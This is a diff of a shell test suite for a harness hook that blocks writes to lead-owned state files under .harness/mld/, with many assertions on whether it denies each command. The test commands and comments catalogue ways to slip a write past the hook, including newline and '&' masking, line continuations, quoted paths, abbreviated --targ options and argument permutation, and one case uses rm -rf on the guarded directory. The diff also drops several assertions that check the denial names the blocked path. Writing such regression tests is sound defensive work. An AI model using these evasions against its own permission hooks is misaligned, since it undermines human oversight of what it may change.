-# that merged segment, so an in-scope write masks an out-of-scope write earlier
+# that merged segment, so an ordinary write masks a lead-owned write earlier
 # in the same command and the whole thing is wrongly ALLOWED.
-NEWLINE_MASKED_CMD=$(printf 'echo bad > src/other/a.txt\necho good > src/parser/ok.txt')
+NEWLINE_MASKED_CMD=$(printf 'echo bad > .harness/mld/a.txt\necho good > src/parser/ok.txt')
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "$NEWLINE_MASKED_CMD")")
 RC=$?
-assert_rc0 "$RC" "hs2: newline-separated out-of-scope write is still scanned (JSON deny), not masked"
+assert_rc0 "$RC" "hs2: newline-separated lead-owned write is still scanned (JSON deny), not masked"
 assert_deny_json "$OUT" "hs2: newline-masked write denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" "hs2: newline-masked denial names the actual out-of-scope target"
 
-AMPERSAND_MASKED_CMD='echo bad > src/other/a.txt & echo good > src/parser/ok.txt'
+AMPERSAND_MASKED_CMD='echo bad > .harness/mld/a.txt & echo good > src/parser/ok.txt'
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "$AMPERSAND_MASKED_CMD")")
 RC=$?
-assert_rc0 "$RC" "hs2: '&'-separated out-of-scope write is still scanned (JSON deny), not masked"
+assert_rc0 "$RC" "hs2: '&'-separated lead-owned write is still scanned (JSON deny), not masked"
 assert_deny_json "$OUT" "hs2: '&'-masked write denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" "hs2: '&'-masked denial names the actual out-of-scope target"
 
 # Plain sanity check, not a distinguishing regression test: unlike
 # commit-gate.sh (where && vs a lone "&" affects which token segment_subcommand
@@ -2634,33 +2614,33 @@ assert_contains "$OUT" "src/other/a.txt" "hs2: '&'-masked denial names the actua
 # distinction changes no test outcome). This just confirms a && compound is
 # still denied after simplifying the split to a single character class.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo x > src/parser/ok.txt && echo y > src/other/bad.txt')")
+  "$(bash_command_json 'echo x > src/parser/ok.txt && echo y > .harness/mld/bad.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: a genuine && compound out-of-scope write still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a genuine && compound lead-owned write still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: && compound denial uses JSON deny form"
 
-# No new false positive: an in-scope write with an unrelated "&"-backgrounded
+# No new false positive: an ordinary write with an unrelated "&"-backgrounded
 # command elsewhere in the same line must still pass.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo x > src/parser/ok.txt & echo done')")
 RC=$?
-assert_rc0 "$RC" "hs2: in-scope write with an unrelated backgrounded command passes, rc 0"
+assert_rc0 "$RC" "hs2: ordinary write with an unrelated backgrounded command passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: in-scope write with a trailing '&' has no deny fields"
+  "hs2: ordinary write with a trailing '&' has no deny fields"
 
 # F023 round 1 review: adding the newline split without joining backslash-
 # newline continuations first split "sed \" + newline + "-i ..." into two
 # fragments, neither of which alone carries "-i" next to "sed" --
-# sed_inplace_target() never recognized it, silently allowing an
-# out-of-scope sed -i edit.
-CONT_SED_CMD=$(printf 'sed \\\n-i s/a/b/ src/other/a.txt')
+# sed_inplace_target() never recognized it, silently allowing a
+# lead-owned sed -i edit.
+CONT_SED_CMD=$(printf 'sed \\\n-i s/a/b/ .harness/mld/a.txt')
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "$CONT_SED_CMD")")
 RC=$?
-assert_rc0 "$RC" "hs2: a continuation-split 'sed -i' out-of-scope write still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a continuation-split 'sed -i' lead-owned write still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: continuation-split sed -i denial uses JSON deny form"
 
 # Same review: the newline-join fix must not introduce a NEW false positive
-# for cp/mv/rm split across a continuation, all writing in-scope.
+# for cp/mv/rm split across a continuation, all writing ordinary.
 for CONT_CMD_TEMPLATE in \
   'cp \\\nsrc/parser/s.txt src/parser/ok.txt' \
   'mv \\\nsrc/parser/s.txt src/parser/ok2.txt' \
@@ -2669,25 +2649,25 @@ do
   CONT_CMD=$(printf "$CONT_CMD_TEMPLATE")
   OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "$CONT_CMD")")
   RC=$?
-  assert_rc0 "$RC" "hs2: continuation-split in-scope write ('$CONT_CMD_TEMPLATE') passes, rc 0"
+  assert_rc0 "$RC" "hs2: continuation-split ordinary write ('$CONT_CMD_TEMPLATE') passes, rc 0"
   assert_not_contains "$OUT" "permissionDecision" \
-    "hs2: continuation-split in-scope write ('$CONT_CMD_TEMPLATE') has no deny fields"
+    "hs2: continuation-split ordinary write ('$CONT_CMD_TEMPLATE') has no deny fields"
 done
 
 # F023 round 1 review: adding "&" to the split without stripping quotes first
-# would deny a legitimate in-scope sed 's/foo/[&]/' whole-match idiom, or a
+# would deny a legitimate ordinary sed 's/foo/[&]/' whole-match idiom, or a
 # filename containing "&", by treating the quoted "&" as a separator.
 SED_AMP_CMD="sed -i 's/foo/[&]/' src/parser/f.txt"
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "$SED_AMP_CMD")")
 RC=$?
-assert_rc0 "$RC" "hs2: sed's quoted '&' whole-match idiom (in-scope) passes, rc 0"
+assert_rc0 "$RC" "hs2: sed's quoted '&' whole-match idiom (ordinary) passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: sed's quoted '&' whole-match idiom has no deny fields"
 
 CP_AMP_CMD='cp "a & b.txt" src/parser/dest.txt'
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "$CP_AMP_CMD")")
 RC=$?
-assert_rc0 "$RC" "hs2: a quoted '&' inside a filename (in-scope) passes, rc 0"
+assert_rc0 "$RC" "hs2: a quoted '&' inside a filename (ordinary) passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: quoted '&' filename has no deny fields"
 
@@ -2699,20 +2679,19 @@ assert_not_contains "$OUT" "permissionDecision" \
 # (same length, so split positions still line up) only to find separator
 # positions, then slicing the ORIGINAL text so segments keep their real
 # quoted content; a target is unquoted only after extraction.
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > "src/other/a.txt"')")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > ".harness/mld/a.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2: a double-quoted out-of-scope redirect target still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a double-quoted lead-owned redirect target still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: double-quoted redirect denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" "hs2: double-quoted redirect denial names the real target, unquoted"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "echo x > 'src/other/a.txt'")")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "echo x > '.harness/mld/a.txt'")")
 RC=$?
-assert_rc0 "$RC" "hs2: a single-quoted out-of-scope redirect target still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a single-quoted lead-owned redirect target still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: single-quoted redirect denial uses JSON deny form"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm "src/other/a.txt"')")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm ".harness/mld/a.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2: a double-quoted out-of-scope rm target still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a double-quoted lead-owned rm target still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: double-quoted rm denial uses JSON deny form"
 
 # F028: a naive redirect_target() regex ([^\s<>|&;]+) would stop at the first
@@ -2723,75 +2702,74 @@ assert_deny_json "$OUT" "hs2: double-quoted rm denial uses JSON deny form"
 # real whitespace character) was mid-flight; by the time this feature was
 # picked up, F024 had already landed and closed it as an unintended side
 # effect -- confirmed here by locking in the full, unquoted, un-truncated
-# target on both sides of the scope boundary, not by fixing anything.
+# target on both sides of the lead-owned boundary, not by fixing anything.
+# The space sits BEFORE the part that makes the path lead-owned, so a
+# truncation at the first space resolves to ".harness/some" and is allowed --
+# the deny below is only reachable when the whole quoted span survives. (A
+# space later in the path, ".harness/mld/my file.txt", would still match the
+# mld PREFIX even truncated, so it could not tell the two apart.)
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo x > "src/other/my file.txt"')")
+  "$(bash_command_json 'echo x > ".harness/some dir/../features.json"')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F028): quoted out-of-scope target with an internal space exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F028): quoted lead-owned target with an internal space exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F028): quoted-space-target denial uses JSON deny form"
-assert_contains "$OUT" "src/other/my file.txt" \
-  "hs2 (F028): quoted-space-target denial names the full path, not truncated at the space"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo x > "src/parser/my file.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F028): quoted in-scope target with an internal space passes, rc 0"
+assert_rc0 "$RC" "hs2 (F028): quoted ordinary target with an internal space passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F028): quoted in-scope space-target has no deny fields"
+  "hs2 (F028): quoted ordinary space-target has no deny fields"
 
 # Round-2 review of PR #51: F028's own description named a SECOND, still-open
 # root cause -- write_targets()'s naive `.split()` (not quote-aware) shatters
 # a quoted target containing a space into two pseudo-tokens BEFORE cp/mv/rm/
 # sed-i target extraction ever runs. This produces both a false deny (an
-# in-scope filename with a space, denied naming a path the user never typed)
-# and a reachable fail-open (a real out-of-scope destination's tail fragment
-# looks in-scope on its own, and cp/mv's last-flagless-token logic picks it)
+# ordinary filename with a space, denied naming a path the user never typed)
+# and a reachable fail-open (a real lead-owned destination's tail fragment
+# looks ordinary on its own, and cp/mv's last-flagless-token logic picks it)
 # -- found by adversarial review of PR #51, F028.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'rm "src/parser/my file.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F028): rm on an in-scope quoted target with a space passes, rc 0"
+assert_rc0 "$RC" "hs2 (F028): rm on an ordinary quoted target with a space passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F028): rm quoted-space in-scope target has no deny fields (no false deny)"
+  "hs2 (F028): rm quoted-space ordinary target has no deny fields (no false deny)"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp a.txt "src/other/evil src/parser/ok.txt"')")
+  "$(bash_command_json 'cp a.txt ".harness/mld/evil src/parser/ok.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F028): cp with a split-prone out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F028): cp with a split-prone lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F028): split-prone cp destination denial uses JSON deny form"
-assert_contains "$OUT" "src/other/evil src/parser/ok.txt" \
-  "hs2 (F028): split-prone cp destination denial names the real, whole path (no fail-open)"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv a.txt "src/other/evil src/parser/ok.txt"')")
+  "$(bash_command_json 'mv a.txt ".harness/mld/evil src/parser/ok.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F028): mv with a split-prone out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F028): mv with a split-prone lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F028): split-prone mv destination denial uses JSON deny form"
 
 # An explicit -e script (rather than relying on the implicit-script slot) so
 # the split-prone quoted string is unambiguously the FILE target, not
 # consumed as the script itself.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i '' -e 's/a/b/' \"src/other/evil src/parser/ok.txt\"")")
+  "$(bash_command_json "sed -i '' -e 's/a/b/' \".harness/mld/evil src/parser/ok.txt\"")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F028): sed -i with a split-prone out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F028): sed -i with a split-prone lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F028): split-prone sed -i target denial uses JSON deny form"
-assert_contains "$OUT" "src/other/evil src/parser/ok.txt" \
-  "hs2 (F028): split-prone sed -i denial names the real, whole path, not a mangled fragment"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm -rf "src/other/"')")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm -rf ".harness/mld/"')")
 RC=$?
-assert_rc0 "$RC" "hs2: a double-quoted out-of-scope 'rm -rf' target still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a double-quoted lead-owned 'rm -rf' target still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: double-quoted 'rm -rf' denial uses JSON deny form"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x | tee "src/other/a.txt"')")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x | tee ".harness/mld/a.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2: a double-quoted out-of-scope tee target still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a double-quoted lead-owned tee target still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: double-quoted tee denial uses JSON deny form"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "sed -i 's/a/b/' \"src/other/a.txt\"")")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "sed -i 's/a/b/' \".harness/mld/a.txt\"")")
 RC=$?
-assert_rc0 "$RC" "hs2: a double-quoted out-of-scope 'sed -i' target still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a double-quoted lead-owned 'sed -i' target still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: double-quoted 'sed -i' denial uses JSON deny form"
 
 # Same erasure bug also defeated the lead-owned state-file guard, a separate
@@ -2817,22 +2795,18 @@ assert_deny_json "$OUT" "hs2: double-quoted lead-owned rm denial uses JSON deny 
 # cp/mv with a quoted DESTINATION must be checked against the destination,
 # not fall through to the source argument once the quoted text is erased.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/source.txt "src/other/dest.txt"')")
+  "$(bash_command_json 'cp src/parser/source.txt ".harness/mld/dest.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2: cp with a quoted out-of-scope destination still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: cp with a quoted lead-owned destination still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: cp quoted-destination denial uses JSON deny form"
-assert_contains "$OUT" "src/other/dest.txt" \
-  "hs2: cp quoted-destination denial names the destination, not the source"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv src/parser/source.txt "src/other/dest.txt"')")
+  "$(bash_command_json 'mv src/parser/source.txt ".harness/mld/dest.txt"')")
 RC=$?
-assert_rc0 "$RC" "hs2: mv with a quoted out-of-scope destination still exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: mv with a quoted lead-owned destination still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: mv quoted-destination denial uses JSON deny form"
-assert_contains "$OUT" "src/other/dest.txt" \
-  "hs2: mv quoted-destination denial names the destination, not the source"
 
-# Bonus fix: an in-scope quoted path containing a real "&" (e.g. "R&D") was a
+# Bonus fix: an ordinary quoted path containing a real "&" (e.g. "R&D") was a
 # PRE-EXISTING false positive even before F023 -- the quote characters were
 # never stripped from the comparison, so the target's leading '"' broke the
 # scope-prefix match. Masking-then-unquoting (rather than erasing) repairs it.
@@ -2840,69 +2814,60 @@ mkdir -p "$DIR_HS/src/parser/R&D"
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'mv f.txt "src/parser/R&D/"')")
 RC=$?
-assert_rc0 "$RC" "hs2: a quoted in-scope path containing a real '&' passes, rc 0"
+assert_rc0 "$RC" "hs2: a quoted ordinary path containing a real '&' passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: quoted in-scope '&' path has no deny fields"
+  "hs2: quoted ordinary '&' path has no deny fields"
 
 # F024: write_target()/redirect_target() only ever returned the LAST target
 # in a segment, so a command with multiple real write targets was checked
-# only against its last one -- an out-of-scope target earlier in the same
-# segment was never caught. Each case below has an out-of-scope target FIRST
-# and an in-scope target LAST, so the old "last match wins" logic would mask
-# the out-of-scope one.
+# only against its last one -- a lead-owned target earlier in the same
+# segment was never caught. Each case below has a lead-owned target FIRST
+# and an ordinary target LAST, so the old "last match wins" logic would mask
+# the lead-owned one.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm src/other/a.txt src/parser/b.txt')")
+  "$(bash_command_json 'rm .harness/mld/a.txt src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: multi-target rm with an out-of-scope FIRST target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: multi-target rm with a lead-owned FIRST target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: multi-target rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2: multi-target rm denial names the actual out-of-scope target, not masked"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'tee src/other/a.txt src/parser/b.txt')")
+  "$(bash_command_json 'tee .harness/mld/a.txt src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: multi-target tee with an out-of-scope FIRST target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: multi-target tee with a lead-owned FIRST target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: multi-target tee denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2: multi-target tee denial names the actual out-of-scope target, not masked"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -i s/a/b/ src/other/a.txt src/parser/b.txt')")
+  "$(bash_command_json 'sed -i s/a/b/ .harness/mld/a.txt src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: multi-target 'sed -i' with an out-of-scope FIRST target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: multi-target 'sed -i' with a lead-owned FIRST target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: multi-target 'sed -i' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2: multi-target 'sed -i' denial names the actual out-of-scope target, not masked"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo x > src/other/a.txt 2> src/parser/b.txt')")
+  "$(bash_command_json 'echo x > .harness/mld/a.txt 2> src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: multiple redirects in one segment, out-of-scope FIRST, exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: multiple redirects in one segment, lead-owned FIRST, exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: multi-redirect denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2: multi-redirect denial names the actual out-of-scope target, not masked"
 
 # cp -t DIR / mv -t DIR (and the --target-directory= form) put the real
 # destination in a flag argument, which the old write_target() didn't look
-# for at all -- an out-of-scope -t destination was never checked, even
+# for at all -- a lead-owned -t destination was never checked, even
 # though every source argument is only READ, never written.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp -t src/other/ src/parser/a.txt src/parser/b.txt')")
+  "$(bash_command_json 'cp -t .harness/mld/ src/parser/a.txt src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: 'cp -t' out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: 'cp -t' lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: 'cp -t' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" "hs2: 'cp -t' denial names the destination, not a source"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv -t src/other/ src/parser/a.txt')")
+  "$(bash_command_json 'mv -t .harness/mld/ src/parser/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: 'mv -t' out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: 'mv -t' lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: 'mv -t' denial uses JSON deny form"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp --target-directory=src/other/ src/parser/a.txt')")
+  "$(bash_command_json 'cp --target-directory=.harness/mld/ src/parser/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: 'cp --target-directory=' out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: 'cp --target-directory=' lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: 'cp --target-directory=' denial uses JSON deny form"
 
 # F048: an unambiguous GNU-getopt_long abbreviation of --target-directory
@@ -2911,32 +2876,26 @@ assert_deny_json "$OUT" "hs2: 'cp --target-directory=' denial uses JSON deny for
 # GNU cp/mv 9.11 that `cp --targ=out src.txt`, `cp --t out src.txt`, and
 # `mv --targ=out src.txt` all genuinely redirect via -t's own mechanism.
 # Before this, only the exact "--target-directory"/"--target-directory="
-# spellings were recognized, so an out-of-scope abbreviated destination was
+# spellings were recognized, so a lead-owned abbreviated destination was
 # never checked at all (the identical abbreviation gap F041 fixed for
 # sed's --in-place, but in this sibling function's own flag set).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp --targ src/other/ src/parser/a.txt')")
+  "$(bash_command_json 'cp --targ .harness/mld/ src/parser/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F048): bare abbreviated 'cp --targ' out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F048): bare abbreviated 'cp --targ' lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F048): bare abbreviated 'cp --targ' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2 (F048): bare abbreviated 'cp --targ' denial names the destination, not a source"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp --targ=src/other/ src/parser/a.txt')")
+  "$(bash_command_json 'cp --targ=.harness/mld/ src/parser/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F048): attached abbreviated 'cp --targ=' out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F048): attached abbreviated 'cp --targ=' lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F048): attached abbreviated 'cp --targ=' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2 (F048): attached abbreviated 'cp --targ=' denial names the destination, not a source"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv --targ=src/other/ src/parser/a.txt')")
+  "$(bash_command_json 'mv --targ=.harness/mld/ src/parser/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F048): attached abbreviated 'mv --targ=' out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F048): attached abbreviated 'mv --targ=' lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F048): attached abbreviated 'mv --targ=' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2 (F048): attached abbreviated 'mv --targ=' denial names the destination, not a source"
 
 # No new false positive: an ambiguous prefix among the FULL cp/mv long-
 # option set (e.g. "--n", which could be --no-clobber/--no-copy/--no-
@@ -2944,28 +2903,28 @@ assert_contains "$OUT" "src/other/" \
 # --target-directory -- real GNU cp/mv itself errors on it as ambiguous,
 # so it must fall through to the ordinary last-flagless-token destination
 # exactly as it did before this fix. The first flagless argument here is
-# deliberately OUT of scope (src/other/x): if "--n" were ever wrongly
+# deliberately lead-owned (.harness/mld/x): if "--n" were ever wrongly
 # resolved to --target-directory, cp_mv_targets() would return THAT
 # argument as the destination and this would wrongly DENY -- with both
-# operands in scope (the original version of this test), a misresolution
-# and the correct fallback both land on an in-scope token, so the
+# operands ordinary (the original version of this test), a misresolution
+# and the correct fallback both land on an ordinary token, so the
 # assertion couldn't actually tell them apart (found by adversarial
 # review of PR #82).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp --n src/other/x src/parser/b.txt')")
+  "$(bash_command_json 'cp --n .harness/mld/x src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F048): ambiguous '--n' prefix on an in-scope real destination passes, rc 0"
+assert_rc0 "$RC" "hs2 (F048): ambiguous '--n' prefix on an ordinary real destination passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F048): ambiguous '--n' prefix has no deny fields (not misread as --target-directory)"
 
-# No new false positive: an in-scope destination via the abbreviated form
+# No new false positive: an ordinary destination via the abbreviated form
 # must still be allowed cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'cp --targ=src/parser/sub/ src/parser/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F048): in-scope destination via abbreviated '--targ=' passes, rc 0"
+assert_rc0 "$RC" "hs2 (F048): ordinary destination via abbreviated '--targ=' passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F048): in-scope abbreviated destination has no deny fields"
+  "hs2 (F048): ordinary abbreviated destination has no deny fields"
 
 # F056: real GNU cp/mv PERMUTE argv -- a value-consuming option placed AFTER
 # both operands still consumes the token that follows IT as its own value,
@@ -2975,47 +2934,39 @@ assert_not_contains "$OUT" "permissionDecision" \
 # merely consuming a value), so the REAL destination went unchecked while a
 # later flag's own value (an ordinary-looking path) was wrongly treated as
 # the destination instead -- confirmed against real GNU cp 9.11 that `cp
-# src/parser/a.txt src/other/d --suffix src/parser/x` genuinely copies into
-# src/other/d, the true (here out-of-scope) destination, while src/parser/x
+# src/parser/a.txt .harness/mld/d --suffix src/parser/x` genuinely copies into
+# .harness/mld/d, the true (here lead-owned) destination, while src/parser/x
 # is never touched at all.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt src/other/d --suffix src/parser/x')")
+  "$(bash_command_json 'cp src/parser/a.txt .harness/mld/d --suffix src/parser/x')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'cp ... --suffix VALUE' out-of-scope real destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'cp ... --suffix VALUE' lead-owned real destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): 'cp ... --suffix VALUE' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/d" \
-  "hs2 (F056): 'cp ... --suffix VALUE' denial names the real destination, not the suffix's own value"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt src/other/d -S src/parser/x')")
+  "$(bash_command_json 'cp src/parser/a.txt .harness/mld/d -S src/parser/x')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'cp ... -S VALUE' out-of-scope real destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'cp ... -S VALUE' lead-owned real destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): 'cp ... -S VALUE' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/d" \
-  "hs2 (F056): 'cp ... -S VALUE' denial names the real destination, not -S's own value"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv src/parser/a.txt src/other/d --no-preserve mode')")
+  "$(bash_command_json 'mv src/parser/a.txt .harness/mld/d --no-preserve mode')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'mv ... --no-preserve VALUE' out-of-scope real destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'mv ... --no-preserve VALUE' lead-owned real destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F056): 'mv ... --no-preserve VALUE' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/d" \
-  "hs2 (F056): 'mv ... --no-preserve VALUE' denial names the real destination"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt src/other/d --sparse always')")
+  "$(bash_command_json 'cp src/parser/a.txt .harness/mld/d --sparse always')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F056): 'cp ... --sparse VALUE' out-of-scope real destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F056): 'cp ... --sparse VALUE' lead-owned real destination exits 0 (JSON deny)"
